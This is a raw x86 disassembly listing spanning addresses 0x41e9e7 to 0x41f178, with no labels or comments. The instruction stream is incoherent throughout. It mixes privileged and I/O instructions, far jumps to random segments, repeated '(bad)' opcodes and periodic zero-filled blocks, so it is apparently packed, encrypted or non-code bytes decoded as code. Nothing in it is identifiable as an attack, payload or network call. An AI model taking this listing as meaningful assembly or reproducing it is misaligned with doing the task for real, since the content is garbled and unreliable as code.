  41e9e7:	push   ebp
  41e9e8:	fwait
  41e9e9:	loopne 0x41e9c8
  41e9eb:	and    eax,0xb68b51a6
  41e9f0:	sar    al,cl
  41e9f2:	ret    0xfa4f
  41e9f5:	cs popa 
  41e9f7:	es dec eax
  41e9f9:	sub    esi,eax
  41e9fb:	arpl   WORD PTR [ebx],si
  41e9fd:	repz rcr BYTE PTR cs:[ecx],cl
  41ea01:	push   ebp
  41ea02:	mov    DWORD PTR [edi+0xa],edi
  41ea05:	cdq    
  41ea06:	pushf  
  41ea07:	adc    edi,DWORD PTR [edx+0x6b105152]
  41ea0d:	adc    al,0xac
  41ea0f:	xchg   esi,eax
  41ea10:	mov    BYTE PTR [edi+0x4519c92a],bh
  41ea16:	adc    eax,0x6a552c1
  41ea1b:	icebp  
  41ea1c:	jae    0x41ea3c
  41ea1e:	jae    0x41ea4c
  41ea20:	cmp    edi,DWORD PTR [ebx-0x12]
  41ea23:	mov    eax,0x2b4cc3a1
  41ea28:	imul   edx,DWORD PTR [edi+0x4c107d6e],0x67ad823e
  41ea32:	dec    ebp
  41ea33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea34:	sub    eax,0xd2d460c9
  41ea39:	mov    dl,0x43
  41ea3b:	ja     0x41e9f3
  41ea3d:	add    DWORD PTR [ecx-0x1e],ebp
  41ea40:	mov    ecx,0xef07b0d6
  41ea45:	fcmove st,st(2)
  41ea47:	lock cmp BYTE PTR [ebx+0x704a9377],ah
  41ea4e:	popa   
  41ea4f:	and    al,0x0
	...
  41ea59:	add    BYTE PTR [eax],al
  41ea5b:	jo     0x41ea80
  41ea5d:	and    eax,0x7c6f7769
  41ea62:	cmp    esp,DWORD PTR [eax+0x7cbcee1c]
  41ea68:	imul   ecx,DWORD PTR [esp+esi*4-0x35],0xffffff8d
  41ea6d:	add    DWORD PTR [eax],eax
  41ea6f:	lods   eax,DWORD PTR ds:[esi]
  41ea70:	add    BYTE PTR [eax],al
  41ea72:	add    BYTE PTR [ebx],cl
  41ea74:	outs   dx,BYTE PTR ds:[esi]
  41ea75:	cmp    ecx,ebp
  41ea77:	dec    edx
  41ea78:	push   ds
  41ea79:	add    BYTE PTR [edi-0x54],cl
  41ea7c:	sub    eax,0xea8d2ae9
  41ea81:	es push ss
  41ea83:	jmp    0x290d:0xd87d2c5
  41ea8a:	lods   eax,DWORD PTR ds:[esi]
  41ea8b:	out    0x82,al
  41ea8d:	div    BYTE PTR [eax-0x52]
  41ea90:	push   es
  41ea91:	icebp  
  41ea92:	mov    ecx,0x6d295279
  41ea97:	rcl    DWORD PTR [eax+0x2d],0x25
  41ea9b:	pop    esp
  41ea9c:	inc    ebp
  41ea9d:	adc    BYTE PTR [edi-0x490f8d4],0x8a
  41eaa4:	es out dx,al
  41eaa6:	pop    ss
  41eaa7:	or     al,0xb
  41eaa9:	rcr    BYTE PTR [edi],1
  41eaab:	int3   
  41eaac:	xor    dl,BYTE PTR [edi+0x2d]
  41eaaf:	sub    ebp,edi
  41eab1:	mov    al,ds:0x70ce291f
  41eab6:	js     0x41ea5b
  41eab8:	push   ss
  41eab9:	clc    
  41eaba:	imul   eax,DWORD PTR [edi+0x26cc3539],0x3395c1f4
  41eac4:	xchg   edi,eax
  41eac5:	push   eax
  41eac6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eac7:	jp     0x41eb2d
  41eac9:	xchg   edi,eax
  41eaca:	mov    ebp,0x399cc53a
  41eacf:	xchg   edi,eax
  41ead0:	test   al,0x22
  41ead2:	scas   al,BYTE PTR es:[edi]
  41ead3:	sahf   
  41ead4:	jp     0x41ea86
  41ead6:	xlat   BYTE PTR ds:[ebx]
  41ead7:	mov    bh,0x5d
  41ead9:	iret   
  41eada:	test   DWORD PTR [ebp+edx*4+0x6a10fcba],0xbc5164f6
  41eae5:	mov    bh,BYTE PTR [ebx]
  41eae7:	xchg   esi,eax
  41eae8:	(bad)  
  41eae9:	(bad)  
  41eaea:	gs adc al,0xee
  41eaed:	add    DWORD PTR [ecx],esi
  41eaef:	and    esp,DWORD PTR [ecx]
  41eaf1:	inc    edx
  41eaf2:	mov    al,0x91
  41eaf4:	inc    ecx
  41eaf5:	pop    edx
  41eaf6:	and    al,0xa3
  41eaf8:	ins    BYTE PTR es:[edi],dx
  41eaf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eafa:	jmp    DWORD PTR [eax-0x60]
  41eafd:	test   al,0x58
  41eaff:	xor    al,0xd8
  41eb01:	retf   
  41eb02:	imul   ebp,DWORD PTR [edx-0x121a3a5c],0xeda5b60b
  41eb0c:	and    DWORD PTR [ecx-0x2b],eax
  41eb0f:	iret   
  41eb10:	mov    ds:0xb528f622,eax
  41eb15:	leave  
  41eb16:	lds    edi,FWORD PTR [esp+edi*8+0x78]
  41eb1a:	(bad)  
  41eb1d:	sbb    al,0x1a
  41eb1f:	mov    cl,0x0
	...
  41eb29:	add    BYTE PTR [eax],al
  41eb2b:	xchg   esp,eax
  41eb2c:	nop
  41eb2d:	ffree  st(0)
  41eb2f:	(bad)  
  41eb31:	popf   
  41eb32:	aam    0x57
  41eb34:	(bad)
  41eb38:	jle    0x41eb01
  41eb3a:	mov    ecx,0x18e78
  41eb3f:	lods   eax,DWORD PTR ds:[esi]
  41eb40:	add    BYTE PTR [eax],al
  41eb42:	add    BYTE PTR ds:0x6906bdff,bh
  41eb48:	jmp    0xf589:0x20937fb9
  41eb4f:	inc    edi
  41eb50:	ins    DWORD PTR es:[edi],dx
  41eb51:	push   ss
  41eb52:	mov    dl,0x8d
  41eb54:	adc    DWORD PTR [esi+0x1942f243],esp
  41eb5a:	ja     0x41ebcf
  41eb5c:	into   
  41eb5d:	xchg   esi,eax
  41eb5e:	test   DWORD PTR ss:[ebp+0x7],ebp
  41eb62:	mov    ch,0x45
  41eb64:	fsubr  DWORD PTR [edx]
  41eb66:	in     al,0x6c
  41eb68:	mov    edi,0xb1aaabb8
  41eb6d:	mov    eax,0x785e5d94
  41eb72:	inc    edx
  41eb73:	mov    bl,0xe8
  41eb75:	mov    ecx,0x7f9afc2e
  41eb7a:	into   
  41eb7b:	mov    esi,DWORD PTR ds:0x6372b114
  41eb81:	inc    ebx
  41eb82:	pop    ds
  41eb83:	pop    esi
  41eb84:	inc    eax
  41eb85:	sub    DWORD PTR [ebp+0x27e16aa2],esi
  41eb8b:	mov    ebx,0x7f0bfe72
  41eb90:	fcmovbe st,st(4)
  41eb92:	sbb    dl,BYTE PTR cs:[ebp+0x54]
  41eb96:	cmovns edx,DWORD PTR ds:0x9502f99c
  41eb9d:	loope  0x41eb6e
  41eb9f:	mov    bl,0xac
  41eba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eba2:	loop   0x41eb6d
  41eba4:	repz in al,dx
  41eba6:	add    dh,0x47
  41eba9:	in     al,dx
  41ebaa:	ret    
  41ebab:	popa   
  41ebac:	dec    ebp
  41ebad:	sub    eax,0xffed953e
  41ebb2:	jge    0x41ec2d
  41ebb4:	hlt    
  41ebb5:	fimul  DWORD PTR [edx-0x2b3e16c8]
  41ebbb:	adc    bl,BYTE PTR [eax]
  41ebbd:	fs xchg ebp,eax
  41ebbf:	test   eax,0xef85cf2e
  41ebc4:	sbb    bl,bh
  41ebc6:	mov    bl,0xdf
  41ebc8:	and    ebp,esi
  41ebca:	xchg   edx,eax
  41ebcb:	lds    edx,FWORD PTR [ebx+edx*1+0xeed108c]
  41ebd2:	push   cs
  41ebd3:	inc    esp
  41ebd4:	out    0xd5,eax
  41ebd6:	pusha  
  41ebd7:	ss inc edx
  41ebd9:	call   0x2e89:0x24d4d052
  41ebe0:	xchg   ebp,eax
  41ebe1:	mov    cl,BYTE PTR [eax]
  41ebe3:	mov    eax,0xcffe59f0
  41ebe8:	hlt    
  41ebe9:	test   DWORD PTR [ebp+0x14ee37e8],edx
  41ebef:	lods   eax,DWORD PTR ds:[esi]
	...
  41ebf8:	add    BYTE PTR [eax],al
  41ebfa:	add    ah,dh
  41ebfc:	mov    dl,0x32
  41ebfe:	(bad)  
  41ebff:	jbe    0x41ebd7
  41ec01:	hlt    
  41ec02:	mov    dl,0xb1
  41ec04:	and    al,0xfe
  41ec06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec07:	loope  0x41ebf4
  41ec09:	cmp    DWORD PTR ds:0x18f25,edi
  41ec0f:	lods   eax,DWORD PTR ds:[esi]
  41ec10:	add    BYTE PTR [eax],al
  41ec12:	add    BYTE PTR [eax+0xfc6a724],cl
  41ec18:	jae    0x41ebde
  41ec1a:	loope  0x41ebf4
  41ec1c:	jmp    0x25e74ba9
  41ec21:	mov    ds:0x5ac8c951,al
  41ec26:	jl     0x41ec4e
  41ec28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec29:	ret    0x2dcd
  41ec2c:	shr    DWORD PTR [edi-0x2d],0x4b
  41ec30:	push   ss
  41ec31:	cwde   
  41ec32:	mov    ah,0xc
  41ec34:	and    eax,DWORD PTR [edx-0x5d]
  41ec37:	pop    edx
  41ec38:	inc    ebp
  41ec39:	daa    
  41ec3a:	idiv   BYTE PTR [ebx+0x669a5d0d]
  41ec40:	scas   eax,DWORD PTR es:[edi]
  41ec41:	adc    cl,dl
  41ec43:	test   al,0xf5
  41ec45:	fstp   DWORD PTR [ebx+0x6a]
  41ec48:	jecxz  0x41ec0e
  41ec4a:	mul    DWORD PTR [edx+ebp*8]
  41ec4d:	pop    edi
  41ec4e:	pop    edx
  41ec4f:	pop    esi
  41ec50:	leave  
  41ec51:	jno    0x41ebd8
  41ec53:	mov    esi,0x62a5e812
  41ec58:	sbb    eax,0xd9b7d840
  41ec5d:	arpl   WORD PTR [eax+0x41ddcf11],sp
  41ec63:	stos   BYTE PTR es:[edi],al
  41ec64:	aad    0xbe
  41ec66:	es pop esp
  41ec68:	jno    0x41ec9a
  41ec6a:	bound  edi,QWORD PTR [ebx+0x5cdde30e]
  41ec70:	dec    ecx
  41ec71:	hlt    
  41ec72:	pop    ecx
  41ec73:	outs   dx,BYTE PTR ds:[esi]
  41ec74:	xor    edx,DWORD PTR [edx+edi*4+0x181474c]
  41ec7b:	lea    ecx,[ebx-0x6b646c2f]
  41ec81:	das    
  41ec82:	dec    ebx
  41ec83:	call   0x432aad14
  41ec88:	jns    0x41eca3
  41ec8a:	mov    dh,BYTE PTR [eax]
  41ec8c:	or     eax,0x7b19249d
  41ec91:	js     0x41ec13
  41ec93:	dec    esi
  41ec94:	addr16 mov bh,0x32
  41ec97:	aam    0xf3
  41ec99:	inc    ebx
  41ec9a:	inc    ebx
  41ec9b:	leave  
  41ec9c:	test   BYTE PTR ss:[ecx+0x4f082db6],0xc7
  41eca4:	(bad)  
  41eca5:	sahf   
  41eca6:	in     eax,dx
  41eca7:	call   0x3558:0xc8b2ae7a
  41ecae:	ret    
  41ecaf:	shl    BYTE PTR [edx+0xc4216c8],cl
  41ecb5:	add    BYTE PTR [esi],cl
  41ecb7:	xchg   ecx,ebp
  41ecb9:	mov    dl,BYTE PTR [ebx]
  41ecbb:	jb     0x41eced
  41ecbd:	fs inc ebp
  41ecbf:	pop    edx
	...
  41ecc8:	add    BYTE PTR [eax],al
  41ecca:	add    BYTE PTR [edx],dh
  41eccc:	ror    esi,cl
  41ecce:	mov    ds:0xd37ebfef,al
  41ecd3:	sub    edi,DWORD PTR [esi]
  41ecd5:	out    0x3f,eax
  41ecd7:	push   0xd287ff8a
  41ecdc:	pop    DWORD PTR [ecx]
  41ecde:	add    BYTE PTR [ebp-0x76000000],ch
  41ece4:	les    esp,FWORD PTR [edi]
  41ece6:	push   edx
  41ece7:	xchg   DWORD PTR [edi],ebx
  41ece9:	adc    al,0xa2
  41eceb:	mov    ch,0x9b
  41eced:	and    DWORD PTR [esi*2-0x54126376],eax
  41ecf4:	cmp    DWORD PTR [edi],0x16763ccf
  41ecfa:	jg     0x41ed4b
  41ecfc:	sbb    eax,0xa2476a7d
  41ed01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed02:	mov    edi,0xdcd1e44d
  41ed07:	xor    BYTE PTR [esi-0x3a7c7e1e],bl
  41ed0d:	jl     0x41ed4c
  41ed0f:	sti    
  41ed10:	pop    es
  41ed11:	in     eax,0x47
  41ed13:	and    al,dh
  41ed15:	xchg   esp,eax
  41ed16:	add    eax,0x76d3432c
  41ed1b:	sub    bh,al
  41ed1d:	mov    esp,0xa66a4801
  41ed22:	pop    es
  41ed23:	imul   esi,DWORD PTR [eax-0x9],0xffffffd1
  41ed27:	out    0xf2,al
  41ed29:	leave  
  41ed2a:	outs   dx,DWORD PTR ds:[esi]
  41ed2b:	inc    edi
  41ed2c:	mov    ds:0xb6ca4f55,al
  41ed31:	pop    ss
  41ed32:	sub    BYTE PTR [ebx-0x27fa8e4d],0x40
  41ed39:	or     eax,0x2588b369
  41ed3e:	stos   BYTE PTR es:[edi],al
  41ed3f:	adc    BYTE PTR [edx],bl
  41ed41:	jle    0x41ed7f
  41ed43:	cmp    al,0x3
  41ed45:	jae    0x41eccc
  41ed47:	cwde   
  41ed48:	ret    
  41ed49:	rcr    DWORD PTR [edi],1
  41ed4b:	and    DWORD PTR [eax+0x3c1be0cf],eax
  41ed51:	mov    eax,esi
  41ed53:	(bad)  
  41ed54:	ins    DWORD PTR es:[edi],dx
  41ed55:	mov    eax,ds:0x9afea66f
  41ed5a:	clc    
  41ed5b:	arpl   WORD PTR ds:0xb6d06ae,sp
  41ed61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed62:	pop    ds
  41ed63:	push   esi
  41ed64:	fild   QWORD PTR [edx-0x1d]
  41ed67:	cmp    bh,BYTE PTR [ecx+0xb341450]
  41ed6d:	ins    DWORD PTR es:[edi],dx
  41ed6e:	dec    esp
  41ed6f:	fldenv [edi-0x2]
  41ed72:	and    eax,0x33e23a5b
  41ed77:	xchg   esi,eax
  41ed78:	hlt    
  41ed79:	or     eax,0x54fcec3e
  41ed7e:	dec    esi
  41ed7f:	xchg   BYTE PTR [edx-0x1c318cab],al
  41ed85:	pop    ebx
  41ed86:	leave  
  41ed87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed88:	nop
  41ed89:	and    BYTE PTR [esi],dh
  41ed8b:	or     eax,0xea8f2ed1
	...
  41ed98:	add    BYTE PTR [eax],al
  41ed9a:	add    bl,bl
  41ed9c:	in     eax,dx
  41ed9d:	outs   dx,BYTE PTR ds:[esi]
  41ed9e:	and    bh,BYTE PTR [esi-0x5d]
  41eda1:	(bad)  
  41eda3:	pop    esi
  41eda4:	(bad)  
  41eda5:	mov    DWORD PTR [ebp+0x25a0f116],ecx
  41edab:	jg     0x41ed3d
  41edad:	add    DWORD PTR [eax],eax
  41edaf:	lods   eax,DWORD PTR ds:[esi]
  41edb0:	add    BYTE PTR [eax],al
  41edb2:	add    cl,cl
  41edb4:	(bad)  
  41edb5:	aad    0xc4
  41edb7:	and    al,BYTE PTR [esi-0x1f]
  41edba:	cld    
  41edbb:	lock jae 0x41ee22
  41edbe:	test   DWORD PTR [ebx+0x23e652b9],esp
  41edc4:	jns    0x41ed65
  41edc6:	test   al,0x4b
  41edc8:	inc    edx
  41edc9:	mov    dl,0x79
  41edcb:	push   edi
  41edcc:	inc    esi
  41edcd:	ja     0x41ee2f
  41edcf:	mov    db1,edx
  41edd2:	sbb    edx,DWORD PTR [ebx+0x31]
  41edd5:	scas   al,BYTE PTR es:[edi]
  41edd6:	jnp    0x41ee26
  41edd8:	jl     0x41ee4a
  41edda:	aaa    
  41eddb:	jmp    0xdf6d3cff
  41ede0:	pop    eax
  41ede1:	test   al,0x58
  41ede3:	neg    BYTE PTR [edi+0x2]
  41ede6:	clc    
  41ede7:	xor    ch,BYTE PTR [esi+edi*2-0x53]
  41edeb:	dec    edi
  41edec:	stos   BYTE PTR es:[edi],al
  41eded:	add    al,0x36
  41edef:	fcomp  DWORD PTR [eax-0x981b02a]
  41edf5:	(bad)  
  41edf6:	mov    esi,0x26a038a
  41edfb:	add    eax,0xf79f7372
  41ee00:	pop    ecx
  41ee01:	dec    ebp
  41ee02:	dec    bh
  41ee04:	imul   ebx,eax,0x351e11f6
  41ee0a:	(bad)  
  41ee0b:	ja     0x41eda5
  41ee0d:	test   ebp,eax
  41ee0f:	aaa    
  41ee10:	mov    ecx,0x30322d5d
  41ee15:	cmp    esi,DWORD PTR [eax-0x798b77e7]
  41ee1b:	shr    DWORD PTR [ebp+0x18],1
  41ee1e:	adc    eax,0xcc1aa5b7
  41ee23:	pop    eax
  41ee24:	xor    eax,0xecbfe51c
  41ee29:	mov    esi,cs
  41ee2b:	mov    esp,0xc1ed1749
  41ee30:	mov    ch,0x43
  41ee32:	cmp    ecx,edi
  41ee34:	and    al,0xfb
  41ee36:	xlat   BYTE PTR ds:[ebx]
  41ee37:	and    BYTE PTR [esi+0x63],0xc3
  41ee3b:	test   al,0xbe
  41ee3d:	mov    cl,0x75
  41ee3f:	in     al,dx
  41ee40:	push   cs
  41ee41:	sub    eax,ebp
  41ee43:	and    al,0x2d
  41ee45:	aaa    
  41ee46:	stos   DWORD PTR es:[edi],eax
  41ee47:	adc    dh,BYTE PTR [esi+eiz*4+0x7501a35]
  41ee4e:	dec    edx
  41ee4f:	cmp    ebx,esp
  41ee51:	jp     0x41eebf
  41ee53:	retf   
  41ee54:	adc    al,0xf6
  41ee56:	mov    ebx,ebx
  41ee58:	pop    ebx
  41ee59:	mov    edi,edi
  41ee5b:	add    DWORD PTR ds:0x103096,eax
	...
  41ee69:	add    BYTE PTR [eax],al
  41ee6b:	add    eax,0x6f976b22
  41ee70:	(bad)  
  41ee72:	mov    dl,0x66
  41ee74:	and    BYTE PTR [esi+0x3d52536a],ah
  41ee7a:	and    al,0x2c
  41ee7c:	xchg   ecx,eax
  41ee7d:	add    DWORD PTR [eax],eax
  41ee7f:	lods   eax,DWORD PTR ds:[esi]
  41ee80:	add    BYTE PTR [eax],al
  41ee82:	add    BYTE PTR [ecx+0x79],cl
  41ee85:	gs cld 
  41ee87:	arpl   WORD PTR [edi+0x1c],cx
  41ee8a:	sar    BYTE PTR [edi],cl
  41ee8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee8d:	rcl    BYTE PTR [edi+0x23],1
  41ee90:	inc    ebx
  41ee91:	and    al,0xee
  41ee93:	xlat   BYTE PTR fs:[ebx]
  41ee95:	push   ebx
  41ee96:	inc    ecx
  41ee97:	mov    edx,0xa6b2f56f
  41ee9c:	aas    
  41ee9d:	jae    0x41ef0a
  41ee9f:	xchg   ecx,eax
  41eea0:	pushf  
  41eea1:	add    ch,BYTE PTR [edx]
  41eea3:	in     eax,0xda
  41eea5:	xor    dl,al
  41eea7:	nop
  41eea8:	in     eax,dx
  41eea9:	lock retf 0x78dd
  41eead:	ds sahf 
  41eeaf:	mov    esp,0xc43e0b30
  41eeb4:	inc    ebx
  41eeb5:	(bad)  
  41eeb6:	xlat   BYTE PTR ds:[ebx]
  41eeb7:	mov    ebp,0xc13aeae0
  41eebc:	cwde   
  41eebd:	cmp    al,0xf1
  41eebf:	add    al,0xc9
  41eec1:	es or  ecx,edi
  41eec4:	ret    0xc885
  41eec7:	mov    edi,0x84294e14
  41eecc:	or     DWORD PTR [esi],esp
  41eece:	add    DWORD PTR [esi+0x67],eax
  41eed1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eed2:	loope  0x41ef07
  41eed4:	jp     0x41eeb3
  41eed6:	mov    cl,0xfa
  41eed8:	dec    ebp
  41eed9:	outs   dx,DWORD PTR ds:[esi]
  41eeda:	add    BYTE PTR [ebx+eiz*8],ah
  41eedd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eede:	cmc    
  41eedf:	arpl   WORD PTR [eax-0x5e],ax
  41eee2:	sub    ch,BYTE PTR [edi-0x33c6af30]
  41eee8:	inc    ebx
  41eee9:	cmp    ecx,ebp
  41eeeb:	mov    edi,0x1fad2a56
  41eef0:	lods   al,BYTE PTR ds:[esi]
  41eef1:	and    bh,bh
  41eef3:	inc    esi
  41eef4:	and    cl,cl
  41eef6:	cmp    DWORD PTR [edx],ebp
  41eef8:	in     al,dx
  41eef9:	ja     0x41eea7
  41eefb:	jnp    0x41eebd
  41eefd:	fmul   DWORD PTR [ebx-0x3509ce91]
  41ef03:	sar    DWORD PTR [edx],cl
  41ef05:	lods   al,BYTE PTR ds:[esi]
  41ef06:	mov    ebp,0xd380d611
  41ef0b:	sub    eax,0xb509db38
  41ef10:	nop
  41ef11:	sub    edi,DWORD PTR [ecx]
  41ef13:	pop    eax
  41ef14:	in     al,0xc7
  41ef16:	bound  esi,QWORD PTR [eax]
  41ef18:	cdq    
  41ef19:	hlt    
  41ef1a:	push   0xffffffb7
  41ef1c:	sbb    al,0xd8
  41ef1e:	rcl    DWORD PTR [eax-0x57a71dd1],1
  41ef24:	fld    QWORD PTR [edx]
  41ef26:	jb     0x41ef09
  41ef28:	xchg   esi,eax
  41ef29:	lahf   
  41ef2a:	mov    ch,BYTE PTR [edi+0x77]
  41ef2d:	(bad)  
  41ef2f:	lods   al,BYTE PTR ds:[esi]
	...
  41ef38:	add    BYTE PTR [eax],al
  41ef3a:	add    BYTE PTR [ebx+0x7fd924d4],cl
  41ef40:	stc    
  41ef41:	call   esi
  41ef43:	into   
  41ef44:	inc    ebp
  41ef45:	mov    bh,0x11
  41ef47:	aam    0x6e
  41ef49:	jae    0x41efbb
  41ef4b:	fst    DWORD PTR [ecx+0xad0001]
  41ef51:	add    BYTE PTR [eax],al
  41ef53:	or     al,0xd1
  41ef55:	pop    ebp
  41ef56:	test   al,0xe1
  41ef58:	sbb    eax,0x9bee0c20
  41ef5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef5e:	std    
  41ef5f:	in     eax,dx
  41ef60:	scas   al,BYTE PTR es:[edi]
  41ef61:	sub    eax,0x802d5a08
  41ef66:	popa   
  41ef67:	add    BYTE PTR [edi+0x1b],ah
  41ef6a:	or     eax,0x7ce5f733
  41ef6f:	push   esi
  41ef70:	lods   al,BYTE PTR ds:[esi]
  41ef71:	dec    ebp
  41ef72:	ins    DWORD PTR es:[edi],dx
  41ef73:	ret    
  41ef74:	mov    cs,WORD PTR [ebx-0x6a7024ce]
  41ef7a:	cmp    al,0x86
  41ef7c:	xchg   ecx,eax
  41ef7d:	pushf  
  41ef7e:	js     0x41ef66
  41ef80:	jge    0x41effa
  41ef82:	call   0xc4908656
  41ef87:	pop    ebp
  41ef88:	mov    al,0x55
  41ef8a:	xchg   edx,eax
  41ef8b:	and    BYTE PTR [edx+0x498abe6e],cl
  41ef91:	adc    BYTE PTR [ecx],bl
  41ef93:	dec    esp
  41ef94:	jmp    0x41ef54
  41ef96:	mov    ds:0x7d5bea4e,eax
  41ef9b:	and    DWORD PTR [ebx+0xd3326a7],0xb6afc0ba
  41efa5:	xchg   esp,eax
  41efa6:	dec    esi
  41efa7:	jmp    FWORD PTR [eax]
  41efa9:	mov    esp,DWORD PTR [ecx+esi*2]
  41efac:	repz jmp 0x3736472f
  41efb2:	jae    0x41efec
  41efb4:	xchg   esi,eax
  41efb5:	fiadd  WORD PTR [ecx]
  41efb7:	lds    esi,FWORD PTR [ecx-0x2b19a418]
  41efbd:	inc    ebp
  41efbe:	clc    
  41efbf:	jmp    0xd530:0x11fa0e79
  41efc6:	mov    ?,WORD PTR [edi+edx*2]
  41efc9:	xlat   BYTE PTR gs:[ebx]
  41efcb:	xor    esi,DWORD PTR [ebx+0x51]
  41efce:	pop    ebx
  41efcf:	push   ss
  41efd0:	adc    eax,0xf8fd664b
  41efd5:	(bad)  
  41efd6:	pop    eax
  41efd7:	add    BYTE PTR [eax+0x45],dh
  41efda:	or     eax,0xeb8d4ea5
  41efdf:	test   BYTE PTR [ebx+0x22],ah
  41efe2:	push   0x6
  41efe4:	sbb    esi,ebx
  41efe6:	mov    ecx,eax
  41efe8:	inc    ebp
  41efe9:	pop    ss
  41efea:	imul   edx,DWORD PTR ds:0x97bb1bff,0x22
  41eff1:	dec    esi
  41eff2:	lahf   
  41eff3:	push   ebp
  41eff4:	mul    esi
  41eff6:	mul    DWORD PTR [ecx]
  41eff8:	ficom  DWORD PTR [edx]
  41effa:	pop    esi
  41effb:	or     eax,0x70dce27c
	...
  41f008:	add    BYTE PTR [eax],al
  41f00a:	add    dh,bl
  41f00c:	sub    DWORD PTR [eax-0x210c002e],ebx
  41f012:	sub    eax,0x4af35f6
  41f017:	rol    DWORD PTR [ebx-0x4d],cl
  41f01a:	rol    BYTE PTR [esi-0x52fffe6e],0x0
  41f021:	add    BYTE PTR [eax],al
  41f023:	or     al,0x35
  41f025:	dec    edi
  41f026:	bound  edi,QWORD PTR [ebp+ecx*1-0x43]
  41f02a:	fldcw  WORD PTR [ebp+0x6558e756]
  41f030:	test   DWORD PTR [esi],0xf7c44468
  41f036:	add    DWORD PTR [esi],0x6b
  41f039:	(bad)  
  41f03b:	jno    0x41f050
  41f03d:	outs   dx,BYTE PTR ds:[esi]
  41f03e:	imul   edx,ebx,0xfffffff8
  41f041:	adc    ebx,esp
  41f043:	je     0x41efd1
  41f045:	stc    
  41f046:	push   es
  41f047:	daa    
  41f048:	mov    ebp,0xf6850d8
  41f04d:	mov    ebx,0x6640833b
  41f052:	icebp  
  41f053:	push   0x9aaa1dd6
  41f058:	mov    esi,fs
  41f05a:	mov    esi,DWORD PTR [ebx-0x59f8091f]
  41f060:	js     0x41f034
  41f062:	(bad)  
  41f063:	rcl    BYTE PTR [ecx+0x439e9610],cl
  41f069:	std    
  41f06a:	or     cl,bl
  41f06c:	test   al,dl
  41f06e:	outs   dx,BYTE PTR ds:[esi]
  41f06f:	call   0xd0c7d4a6
  41f074:	inc    edx
  41f075:	xchg   esp,eax
  41f076:	and    eax,0x73d27a0f
  41f07b:	inc    eax
  41f07c:	out    dx,al
  41f07d:	imul   edi,DWORD PTR [ecx+0x3f8d232b],0xffffffbb
  41f084:	gs mov dl,0x91
  41f087:	in     al,0x95
  41f089:	xchg   ecx,eax
  41f08a:	lahf   
  41f08b:	clc    
  41f08c:	push   edi
  41f08d:	sbb    DWORD PTR [edx],esi
  41f08f:	add    DWORD PTR [ebx+0x16],0x54
  41f093:	std    
  41f094:	ins    BYTE PTR es:[edi],dx
  41f095:	mov    dl,0x19
  41f097:	cli    
  41f098:	fucomip st,st(3)
  41f09a:	pop    es
  41f09b:	mov    dh,0x89
  41f09d:	mov    eax,ds:0x153b600d
  41f0a2:	mov    edi,0x76a7da74
  41f0a7:	frstpm(287 only) 
  41f0a9:	aaa    
  41f0aa:	fbstp  TBYTE PTR gs:[eax+0x1a]
  41f0ae:	(bad)  
  41f0af:	daa    
  41f0b0:	mov    BYTE PTR [edi+0xd],al
  41f0b3:	xchg   ecx,eax
  41f0b4:	jl     0x41f0fd
  41f0b6:	retf   0xa143
  41f0b9:	mov    ebp,0xa5d85f16
  41f0be:	inc    edx
  41f0bf:	mov    ebx,0xb35e9221
  41f0c4:	jecxz  0x41f0db
  41f0c6:	mov    dl,0xea
  41f0c8:	pop    ds
  41f0c9:	(bad)  
  41f0ca:	bound  esp,QWORD PTR [ecx-0x228f442d]
	...
  41f0d8:	add    BYTE PTR [eax],al
  41f0da:	add    BYTE PTR [esi+0x3f],cl
  41f0dd:	int3   
  41f0de:	sbb    eax,0x7fdffffd
  41f0e3:	out    dx,eax
  41f0e4:	loopne 0x41f0fc
  41f0e6:	lods   al,BYTE PTR ds:[esi]
  41f0e7:	mov    edx,?
  41f0e9:	adc    BYTE PTR [ebp+0x19333],0xad
  41f0f0:	add    BYTE PTR [eax],al
  41f0f2:	add    BYTE PTR [ecx-0x66],dl
  41f0f5:	mov    al,0xc9
  41f0f7:	stc    
  41f0f8:	mov    DWORD PTR [eax-0x77e77fea],ecx
  41f0fe:	test   BYTE PTR ds:0x564ba157,bl
  41f104:	pop    eax
  41f105:	and    al,0x48
  41f107:	cmp    ebx,eax
  41f109:	push   ecx
  41f10a:	mov    ds:0xb9e14313,al
  41f10f:	out    dx,eax
  41f110:	pop    edx
  41f111:	xchg   BYTE PTR [eax],dl
  41f113:	daa    
  41f114:	fwait
  41f115:	pop    ebx
  41f116:	retf   0x12d0
  41f119:	mov    bh,0xe2
  41f11b:	psubw  mm1,QWORD PTR [edi]
  41f11e:	inc    ecx
  41f11f:	push   esi
  41f120:	bound  ebx,QWORD PTR [eax+0x2f]
  41f123:	icebp  
  41f124:	adc    edx,DWORD PTR ds:0xb55e1aa5
  41f12a:	mov    edi,0xd62cdc70
  41f12f:	sub    cl,BYTE PTR [eax-0x2e0287d0]
  41f135:	loopne 0x41f150
  41f137:	je     0x41f106
  41f139:	cmp    dh,cl
  41f13b:	call   0xfe0979ec
  41f140:	das    
  41f141:	fmul   st,st(5)
  41f143:	xlat   BYTE PTR ds:[ebx]
  41f144:	(bad)  
  41f145:	rcl    ecx,1
  41f147:	mov    ecx,0x88c2a928
  41f14c:	mov    edx,0xc2f8c7f0
  41f152:	pop    ds
  41f153:	cld    
  41f154:	push   edi
  41f155:	sbb    bl,bl
  41f157:	inc    eax
  41f158:	out    dx,al
  41f159:	call   0x3b4a:0x5405ad3b
  41f160:	test   al,0x5c
  41f162:	fiadd  WORD PTR [ecx+0x7a]
  41f165:	pusha  
  41f166:	mov    ah,0x20
  41f168:	aaa    
  41f169:	jl     0x41f1e1
  41f16b:	cmp    eax,0xeb83ab35
  41f170:	stos   DWORD PTR es:[edi],eax
  41f171:	loopne 0x41f110
  41f173:	mov    ecx,0x30c6d694
  41f178:	and    ah,0x57
